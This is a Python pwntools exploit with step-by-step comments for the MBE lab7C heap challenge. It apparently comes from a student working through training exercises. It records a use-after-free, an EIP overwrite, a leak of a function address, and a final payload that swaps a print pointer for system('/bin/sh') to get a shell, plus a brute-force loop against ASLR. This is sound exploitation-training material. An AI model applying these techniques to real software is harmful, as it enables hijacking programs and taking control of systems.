# -*- coding: utf-8 -*-

# Security: Full Metal Jacket Baby!
'''
[*] '/home/karmaz/MBE/7_HEAP/lab7C'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''

# Static code analysis: 
# - strcnt && numcnt can be accessed out of bound 
'''
lab7C.c:94:24: warning: Either the condition 'strcnt<6' is redundant or the array 'strings[6]' is accessed at index 6, which is out of bounds. [arrayIndexOutOfBoundsCond]
                strings[++strcnt] = tempstr;
                       ^
lab7C.c:81:23: note: Assuming that condition 'strcnt<6' is not redundant
            if(strcnt < MAX_STR)
                      ^
lab7C.c:94:24: note: Array index out of bounds
                strings[++strcnt] = tempstr;
                       ^
lab7C.c:115:24: warning: Either the condition 'numcnt<6' is redundant or the array 'numbers[6]' is accessed at index 6, which is out of bounds. [arrayIndexOutOfBoundsCond]
                numbers[++numcnt] = tempnum;
                       ^
lab7C.c:104:23: note: Assuming that condition 'numcnt<6' is not redundant
            if(numcnt < MAX_NUM)
                      ^
lab7C.c:115:24: note: Array index out of bounds
                numbers[++numcnt] = tempnum;
                       ^
'''
# - choice scope can be reduced
'''
lab7C.c:67:18: style: The scope of the variable 'choice' can be reduced. [variableScope]
    unsigned int choice = 0;
'''
# - index && chocie value is never used
'''
lab7C.c:67:25: style: Variable 'choice' is assigned a value that is never used. [unreadVariable]
    unsigned int choice = 0;
                        ^
lab7C.c:68:24: style: Variable 'index' is assigned a value that is never used. [unreadVariable]
    unsigned int index = 0;
                       ^
lab7C.c:178:15: style: Variable 'index' is assigned a value that is never used. [unreadVariable]
        index = 0;
              ^
lab7C.c:179:16: style: Variable 'choice' is assigned a value that is never used. [unreadVariable]
        choice = 0;
               ^
'''

# Running the binary - confirm UAF - this is the same for Make a number:
'''
-- UAF Playground Menu ----------------------
1. Make a string    <== Make a string twice, f.e.  1. AAAA  2. BBBB
2. Make a number
3. Delete a string <=== Then delete strings twice " There are no strings left to delete!"
4. Delete a number
5. Print a string <==== Then print string at index 1 or 2 - there are AAAA and BBBB even if they where deleted.
6. Print a number
7. Quit
---------------------------------------------
Enter Choice: 
'''

# So the pointer of Print string / number points all the time to the same location on the HEAP - thus, there is a possibility to UAF.
# 1. Make a string XXXX
# 2. Delete a string
# 3. Make a number 1094795585 => 0x41414141
# 4. Print a string[1]
'''
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
Invalid $SP address: 0xffb7c12c
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
'''

# Exploit
from pwn import *
#context.log_level = 'debug'

p = process("./lab7C")


def make_number(number):
    p.sendlineafter("Enter Choice: ", "2")
    p.sendlineafter("Input number to store: ", number)

def delete_number():
    p.sendlineafter("Enter Choice: ", "4")

def delete_string():
    p.sendlineafter("Enter Choice: ", "3")

def make_string(payload):
    p.sendlineafter("Enter Choice: ", "1")
    p.sendline(payload)

def print_number(index):
    p.sendlineafter("Enter Choice: ", "6")
    p.sendline(str(index))

def print_string(index):
    p.sendlineafter("Enter Choice: ", "5")
    p.sendline(str(index))

# EIP overwrite
'''
make_string("XXXX")
delete_string()
make_number("1094795585")
print_string("1")
'''

# Memory leak
''' There are 2 structs:
struct data {                   // = [32b] => 4B
    char reserved[8];           // [8b]
    char buffer[20];            // [20b]
    void (* print)(char *);     // [4b]
};
                                
struct number {                     // [32b] => 4B
    unsigned int reserved[6];       // [24b]
    void (* print)(unsigned int);   // [4b]
    unsigned int num;               // [4b]
};

# number is at the same position as pointer to print() 
unsigned int num;               // [4b] ==     void (* print)(char *);     // [4b]

tempstr->print = strlen(tempstr->buffer) > 10 ? big_str : small_str;
'''
###
# How to leak:
# 1. Create a small number
# 2. Delete this number
# 3. Create a string
# 4. Print a number - which will print address of small_num
###
'''
make_number("1234")
delete_number()
make_string("AAAA")
print_number("1")
p.interactive()
'''

# Leaked addr of small_str
'''
Number index to print: not 1337 enough: 1448436789

>>> hex(1448436789)
0x56556435

gdb-peda$ x 0x56556435
0x56556435 <small_str>: 0xfb1e0ff3  <== Leaked addr of small_str 
'''
# Next step is to calculate the relative addr of system() and "/bin/sh"
'''
For system() calculate the relative addr and use it to later bruteforce and bypass ASLR.
    gdb-peda$ p system
    $1 = {<text variable, no debug info>} 0xf7e01830 <system>
    gdb-peda$ p 0xf7e01830 - 0x56556435
    $2 = 0xa18ab3fb <= Relative addr of system()

No need to calculate the "/bin/sh" since it will be stored in the buffer after calling print_string() 
'''

# Final exploit
make_number("1234")
delete_number()
make_string("/bin/sh")
print_number("1")
leak = p.recvuntil("Enter Choice: ")
small_str_addr = int(leak[leak.index("enough: ") + 8 : leak.index("\n")], 10)
base_system_addr = small_str_addr + 0xa17c33fb # relative addr has changed in pwntools, previous was calculated in GDB
log.info("Leak of system() base_addr: " + str(hex(base_system_addr)))
p.sendline("3") # delete_string()
make_number(str(base_system_addr))
print_string("1")

p.interactive()

'''
❯ for i in {1..10000}; do echo whoami | python cracker_lab7C.py | grep karmaz ;done
String index to print: karmaz  <==
'''

# Later on i've found, that aactually on the Virtual Machine this lab is solvable without brute forcing - because libc memory segment is always the same relative addr from code segment.